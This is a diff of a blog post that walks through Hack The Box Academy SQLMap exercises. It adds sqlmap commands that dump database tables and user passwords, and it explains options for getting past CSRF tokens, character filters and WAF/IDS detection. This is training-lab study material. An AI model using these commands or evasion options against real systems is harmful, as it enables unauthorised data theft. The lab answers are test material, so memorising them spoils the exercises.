@@ -1,7 +1,7 @@
 ---
 layout: post
 title:  "Hack The Box - Academy - SQLMap Essentials"
-date:   2024-10-11 12:33
+date:   2024-10-13 23:07
 image:  /images/htb/sqlmap_essentials/logo.png
 tags:   [sqlmap,cbbh]
 categories: [htbacademy]
@@ -84,14 +84,50 @@ sqlmap -r Case7.txt --batch --dump -T flag7 -D testdb --no-cast --level=5 --risk
 ### Database Enumeration & Advanced Database Enumeration - Exercises
 #### What's the contents of table flag1 in the testdb database? (Case #1)
 ```
+sqlmap -r Case1.txt --threads 10 --dump -T flag1 -D testdb -dbms=MySQL --batch
 ```
 
 #### What's the name of the column containing "style" in it's name? (Case #1)
 ```
+sqlmap -r Case1.txt --threads 10 --search -C style --batch
 ```
 
 #### What's the Kimberly user's password? (Case #1)
 ```
+sqlmap -r Case1.txt --threads 10 --dump -D testdb -T users --batch
 ```
 
+### Bypassing Web Application Protections
+#### What's the contents of table flag8? (Case #8) - [anti-CSRF token bypass]
+```
+sqlmap -r Case8.txt --csrf-token=t0ken -T flag8 --dump --risk=3 --level=5 --batch
+```
+- `--csrf-token=t0ken`: This flag is used to specify a CSRF (Cross-Site Request Forgery) token. Many modern web applications use CSRF tokens to prevent unauthorized actions on behalf of a user.
+- In this case, `t0ken` is the placeholder for the actual CSRF token that the web application is using. Sqlmap will substitute this token in each request to bypass CSRF protection
+
+#### What's the contents of table flag9? (Case #9) - [Unique ID]
+```
+sqlmap -r Case9.txt -T flag9 --dump --risk=3 --level=5 --batch --randomize=uid
+```
+- `--randomize=uid`: The `--randomize` flag is used to randomize the value of a specific parameter (in this case, `uid`) in each HTTP request. This is often done to avoid detection by web application firewalls (WAFs) or intrusion detection systems (IDS).
+- Randomizing a parameter like `uid` simulates different users, making the attack harder to detect by automated defenses that might trigger if the same request is made repeatedly.
+
+#### What's the contents of table flag10? (Case #10) - [Primitive protection]
+```
+sqlmap -r Case10.txt -T flag10 --dump --risk=3 --level=5 --batch
+```
+
+#### What's the contents of table flag11? (Case #11) - [Filtering of characters '<', '>']
+```
+sqlmap -r Case11.txt -T flag11 --dump --risk=3 --level=5 --batch --tamper=greatest,least --threads=10
+```
+<hr/>
+
+### OS Exploitation - Exercises
+#### Try to use SQLMap to read the file "/var/www/html/flag.txt".
+```
+```
+#### Use SQLMap to get an interactive OS shell on the remote host and try to find another flag within the host
+```
+```
 <hr/>
